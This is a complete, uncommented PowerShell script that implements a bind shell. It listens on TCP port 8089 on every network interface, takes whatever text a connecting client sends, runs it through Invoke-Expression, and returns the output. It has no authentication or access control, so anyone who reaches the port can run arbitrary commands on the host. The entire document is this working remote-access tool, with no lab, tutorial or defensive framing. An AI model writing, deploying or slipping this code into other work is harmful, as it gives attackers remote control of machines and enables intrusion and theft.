param (
    [int]$Port = 8089
)

function Run-Command($Command) {
    $output = (Invoke-Expression -Command $Command -ErrorAction SilentlyContinue) -join "`n"
    return $output
}

function Start-BindServer {
    $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
    $listener.Start()

    Write-Host "Listening on port $Port..."

    while ($true) {
        $client = $listener.AcceptTcpClient()
        $clientStream = $client.GetStream()
        $clientIP = $client.Client.RemoteEndPoint.ToString()
        Write-Host "Accepted connection from $clientIP"

        while ($client.Connected) {
            $buffer = New-Object Byte[] 1024
            $received = $clientStream.Read($buffer, 0, $buffer.Length)

            if ($received -gt 0) {
                $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $received).Trim()
                if ($command.ToLower() -eq "exit") {
                    $clientStream.Close()
                    $client.Close()
                    Write-Host "Connection closed."
                } else {
                    $output = Run-Command $command
                    $bytesToSend = [System.Text.Encoding]::UTF8.GetBytes($output)
                    $clientStream.Write($bytesToSend, 0, $bytesToSend.Length)
                }
            }
        }
    }
}

Start-BindServer -Port $Port
